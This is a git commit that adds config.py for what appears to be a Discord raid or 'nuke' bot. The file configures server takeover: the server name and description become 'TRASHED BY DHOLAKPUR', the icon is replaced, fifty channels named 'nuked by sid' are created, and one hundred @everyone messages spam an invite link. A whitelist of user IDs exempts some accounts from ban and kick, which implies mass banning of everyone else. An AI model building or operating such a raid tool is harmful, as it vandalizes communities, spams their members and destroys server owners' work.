fb4e571ee3ca64eef868a2224ebc6898ed45ede5
ShashwatSen <114056461+ShashwatSen@users.noreply.github.com>
2024-07-14 21:46:25 +0530

    V1.0.0

---
+++ config.py
@@ -0,0 +1,42 @@
+EMBED_CONFIG = {
+    "title": "SID HERE",    # Maine Embed Title here 
+    "description": "DADDY SID",   # Main Embed Description here 
+    "color": 000000,   # Change embed color if you want (red)
+    "fields": [
+        {"name": "test", "value": "test", "inline": False},    # Embed Field → Juste Modify → Just edit the empty places
+        {"name": "test", "value": "test", "inline": False},
+        {"name": "test","value": "test", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False
+    ],
+    "image": "",   # Embed Icon url here → https://image.jpg
+    "footer": "",  # Embed Footer here 
+}
+
+SERVER_CONFIG = {
+    "new_name": "TRASHED BY DHOLAKPUR",  # New Server Name here 
+    "new_icon": "https://images-ext-1.discordapp.net/external/W0YRxLPLoVwkIOZTSLsalqrmW895TI77ao9nHW4wfx4/%3Fsize%3D1024/https/cdn.discordapp.com/icons/1217116527308963901/a_a69a3d18d6dea267b5de7bfa7d007f17.gif",   # New Server Icon url here → https://image.jpg 
+    "new_description": "TRASHED BY DHOLAKPUR",  # New Server Description here 
+}
+
+WEBHOOK_CONFIG = {
+    "default_name": "SID",  # Webhook Name here 
+}
+
+
+AUTO_RAID_CONFIG = {
+    'num_channels': 50,  # Number of channels
+    'channel_type': 'text',  # text/voice
+    'channel_name': 'nuked by sid',  # Channel name
+    'num_messages': 100,  # Number of message to spam
+    'message_content': '@everyone https://discord.gg/M4nWG6d3YN' # Spam Message
+}
+
+NO_BAN_KICK_ID = {
+    1029093967389806753,       # Put Whitelist ID
+    1027444990139453484,       # No Ban & No Kick
+    222222222222,
+}
+
+BOT_PRESENCE = {
+    "type": "playing",  # "watching", "listening", or "watching"
+    "text": ".gg/dholakpur"  # Your text presence
+}
